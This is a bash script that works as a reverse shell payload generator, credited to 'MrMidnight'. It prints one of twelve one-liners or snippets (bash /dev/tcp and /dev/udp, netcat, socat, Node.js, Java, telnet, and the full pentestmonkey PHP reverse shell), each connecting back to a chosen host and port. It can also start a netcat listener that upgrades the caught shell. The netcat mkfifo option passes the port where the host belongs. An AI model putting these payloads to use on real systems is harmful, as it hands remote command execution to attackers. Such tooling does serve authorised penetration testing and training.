#!/bin/bash
# Autor: MrMidnight
# Version: 1.1

function bash_i_PAYLOAD() {
    echo "$UWUSHELL -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
}

function bash_udp_PAYLOAD(){
  echo "$SHELL -i >& /dev/udp/$LHOST/$LPORT 0>&1"
}

function bash_196_PAYLOAD() {
    echo "$UWUSHELL -c '$UWUSHELL -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
}

function bash_read_line_PAYLOAD() {
    echo -n "while read line; do $line 2>&1 >&3; done"
}

function nc_mkfifo_PAYLOAD(){
  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|$SHELL -i 2>&1|nc $LPORT $LPORT >/tmp/f"
}

function nc_e_PAYLOAD(){
  echo "nc $LHOST $LPORT -e $SHELL"
}

function nc_c_PAYLOAD(){
  echo "nc -c $SHELL $LHOST $LPORT"
}

function socat_tty_PAYLOAD() {
    echo "socat exec:'$UWUSHELL -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT"
}

function node_js_PAYLOAD() {
    echo "node -e 'require(\"child_process\").spawn(\"$UWUSHELL\", [], {stdio: [0, 1, 2]});'"
}

function java_PAYLOAD() {
    echo "r = Runtime.getRuntime()
p = r.exec([\"$UWUSHELL\",\"-c\",\"exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
p.waitFor()"
}

function telnet_PAYLOAD() {
    echo "rm -f /tmp/p; mknod /tmp/p p && telnet $LHOST $LPORT 0/tmp/p"
}

function php_pentestmonkey_PAYLOAD(){
  cat << 'EOF'
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '$LHOST';
$port = $LPORT;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();

    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }

    if ($pid) {
        exit(0);  // Parent exits
    }
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}

?>
EOF
}

function display_help() {
    echo "Usage: $0 [-l|--lhost <lhost>] [-p|--lport <lport>] [-s|--shell <shell>] [-pl|--payload <1-12>] [-sp|--spawn] [-c|--copy] [--help]"
    echo -e "\nOptions:"
    echo "  -l, --lhost    Local host"
    echo "  -p, --lport    Local port"
    echo "  -s, --shell    Shell to use e.g.(/bin/bash)"
    echo "  -pl,--payload  PAYLOAD type (1-12)"
    echo "                 1) Bash-i"
    echo "                 2) Bash UDP"
    echo "                 3) Bash 196"
    echo "                 4) Bash read line"
    echo "                 5) Netcat with mkfifo"
    echo "                 6) Netcat -e"
    echo "                 7) Netcat -c"
    echo "                 8) Socat#2 (TTY)"
    echo "                 9) Node.js"
    echo "                 10) Java"
    echo "                 11) Telnet"
    echo "                 12) PHP Pentest Monkey"
    echo "  -sp, --spawn   Spawn a netcat listener on LPORT"
    echo "  -c, --copy     Copy generated shell command to clipboard"
    echo "  -h, --help         Display this help message"
    exit 0
}

if [ "$#" -eq 0 ]; then
    display_help
fi

while [[ "$#" -gt 0 ]]; do
    case $1 in
        -l|--lhost) LHOST=$2; shift ;;
        -p|--lport) LPORT=$2; shift ;;
        -s|--shell) SHELL=$2; UWUSHELL=$2; shift ;;
        -pl|--payload) PAYLOAD=$2; shift ;;
        -sp|--spawn) SPAWN=true ;;
        -c|--copy) COPY=true;;
        -h|--help) display_help ;;
        *) echo "Unknown parameter passed: $1"; exit 1 ;;
    esac
    shift
done

if [[ -z $LHOST || -z $LPORT || -z $PAYLOAD || -z $UWUSHELL ]]; then
    echo "Usage: $0 [-l|--lhost <lhost>] [-p|--lport <lport>] [-s|--shell <shell>] [-pl|--payload <1-12>] [-sp|--spawn] [-c|--copy] [--help]"
    exit 1
fi

main() {
    case "$PAYLOAD" in
        1) PAYLOAD_command=$(bash_i_PAYLOAD);;
        2) PAYLOAD_command=$(bash_udp_PAYLOAD);;
        3) PAYLOAD_command=$(bash_196_PAYLOAD);;
        4) PAYLOAD_command=$(bash_read_line_PAYLOAD);;
        5) PAYLOAD_command=$(nc_mkfifo_PAYLOAD);;
        6) PAYLOAD_command=$(nc_e_PAYLOAD);;
        7) PAYLOAD_command=$(nc_c_PAYLOAD);;
        8) PAYLOAD_command=$(socat_tty_PAYLOAD);;
        9) PAYLOAD_command=$(node_js_PAYLOAD);;
        10) PAYLOAD_command=$(java_PAYLOAD);;
        11) PAYLOAD_command=$(telnet_PAYLOAD);;
        12) PAYLOAD_command=$(php_pentestmonkey_PAYLOAD);;

        *) echo "Invalid choice"; exit 1;;
    esac

    if [ "$COPY" == true ]; then
      echo "Your Shell: $PAYLOAD_command"
      echo "$PAYLOAD_command" | xclip -selection clipboard
    else
      echo "Your Shell:"
      echo "$PAYLOAD_command"
    fi

    if [ "$SPAWN" == true ]; then
            stty raw -echo; (echo 'python3 -c "import pty;pty.spawn(\"$UWUSHELL\")" || python -c "import pty;pty.spawn(\"$UWUSHELL\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset;cat) | nc -lvnp $LPORT && reset
        fi
}
main